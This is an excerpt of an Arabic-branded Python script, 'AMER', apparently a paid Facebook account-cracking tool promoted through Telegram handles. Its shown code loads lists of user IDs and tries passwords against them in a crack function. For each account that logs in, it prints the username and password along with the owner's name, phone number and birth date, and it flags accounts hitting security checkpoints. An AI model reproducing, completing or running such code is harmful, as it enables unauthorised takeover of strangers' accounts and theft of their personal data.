...
#g= datetime.datetime(2024, 6, 10, 2, 00 ,00)
...
#    if(x.strftime("%X"))>(g.strftime("%X")):
#     print('\n\n')
#     print("     "+'خلص اشتراك عليك مراجعة صانع اداة @MPMPK ☄️🗿')
#     print('\n\n')
#     print(x)
import requests
import bs4
...
output = render('المدفوعة', colors=['red', 'green'], align='center')
print(output)
print('\n')
os.system('clear')
print('\n')
...
class login():
	...
	def lo_epa(self):
		...
		if 'access_token' in po:
			...
			linex()
			print(f"{a40}✦"*60)
			cracke_team(f'{a1}[{a3}√{a1}] {a5}𝗱𝗼𝗻𝗲 𝗻𝗼𝘄 𝗿𝗲𝘀𝘁 𝘁𝗵𝗲 𝘁𝗼𝗼𝗹 ✦')
			linex()
	...
	def login_MPMPK(self):
		...
		if menu in ['461918']:
			...
			linex()
			cracke_team('YOUR CHOSE IS WRONG')
			time.sleep(1)
			login_MPMPK()
...
def MLF():
	...
	from pyfiglet import Figlet as F; from random import choice as c; print("\033[92m" + F(c(["isometric1", "isometric2"])).renderText("AMER"))
	logo =                                          """   
\033[1;92m༄AMER᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄AMER᭄
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄AMER᭄
                           \x1b[1;92m╔═════════════════════════════╗
                           \x1b[1;92m║➣TOOL NAME : [AMER FILE]║
                           \x1b[1;92m║➣CHANNEL   : [@cracke_team]    ║
                           \x1b[1;92m║➣TELEGRAM  : [@cracke_team]       ║
                          \x1b[1;92m ║➣DECoDER : [AMER] ║
                           \x1b[1;92m║➣Group     : []         ║
                           \x1b[1;92m║➣amer     : [king]       ║
                           \x1b[1;92m   <><><><><><>AMER<><><><><><><> 
\033[1;92m༄Mr.᭄\x1b[1;90m   <><><><><><>AMER<><><><><><><> \x1b[1;92m༄AMER᭄
\033[1;92m༄Mr.᭄\x1b[1;90m   <><><><><><>AMER<><><><><><><> \x1b[1;92m༄AMER᭄
"""
	print(logo)
	print("")
...
╚═══════════════════╝      """)
	...
	if xo in ['2']:
		...
		os.system('rm -rf .token.txt')
		linex()
		cracke_team(f"{a1}[{a3}√{a1}] {a5}𝗰𝗼𝗼𝗸𝗶𝗲𝘀 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗱𝗲𝗹𝗲𝘁𝗲𝗱 • ")
		exit()
	if xo in ['3']:
		...
		linex()
		cracke_team(f'{a1}[{a3}×{a1}] {a5}𝘄𝗿𝗼𝗻𝗴 𝗰𝗵𝗼𝗶𝗰𝗲  •')
		time.sleep(1)
		MLF()
siid=[]
sep=[]
...
class file_create_menu():
	...
	def file_unlimmited(self):
		os.system('clear')
		from pyfiglet import Figlet as F; from random import choice as c; print("\033[92m" + F(c(["slant"])).renderText("AMER"))
		print("•" *60)
		limit = int("1")
		try:
		...
		if IOError:
			...
			print('AMER'.format(len(open(lok,'r').read().splitlines())))
...
def contact():
    os.system('xdg-open https://www.facebook.com/AMER ')
    back()
...
⠀⢀⠞⠛⠁⠀⠀⠈⠉⠉⠀⠉⠉⠛⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣷⣆⠀⠀⠀⠀⠀⠀⡂⠀⠀⠀⠀
    ...
    print('')
    print(f'{B}[{M} 1 {B}] {F}– {B}Drag the ID file : سحب ملف ايديات ')
    print('')
...
def RAVE():
    ...
    print(('\033[92m—'*25)+'\n• مدفوعه•\n'+('—'*25))
    print(f'   •••••••••••••••••••••••AMER••••••••••••••••••••••• ' * 20)
    print(f'\n    {X}DEVLOPER :{F} 『AMER』⇣🇮🇶 |5.1M\n    {B}CHANEL TELEGRAM :{M} @cracke_team\n    {U}USER TELEGRAM : {H}@MPMPK\n    NEW UPDATE')
    print(f'{Z}▰{B}▱' * 20)
...
def crack(idf,pwv):
	...
	fff = '%'
	print(f'\r%s{bi}[AMER] %s # %s # OK : %s #  CP : %s #  %s%s%s' %(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ')
	sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'\nسكيور ✖️\n⋘   <><><><><><>AMER<><><><><><><>  𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n\n⚠️ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n\nسكيور حض اوفر عيوني 😐\n   <><><><><><>AMER<><><><><><><> ➩ @MPMPK , @cracke_team\n\t\t\t\t\t'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='سكيور للأسف'))
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f' 𓆩🫶🏻AMER🫶🏻 𓆪 ᯓ ━┅┄࿕ \n🦊 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n🦊 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n••••••••••••••••••••••••••••••••••••••••••••••\n\n🦊 - Nama Akun: {nama}\n\n🦊 - Nomor Aktif : {nomer}\n\n🦊 - Tahun Akun : {tahun}\n\n🦊 - Tanggal Lahir : {ttl}\n\n⋘   ࿕┈┉━ ᯓ 𓆩🫶🏻AMER🫶🏻 𓆪 ᯓ ━┅┄࿕ 𓆪‏\n⊊𝗕𝗬⊋ ➩ @MPMPK/ @cracke_team\n\t\t\t\t\t'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='حساب شغال افرح'))
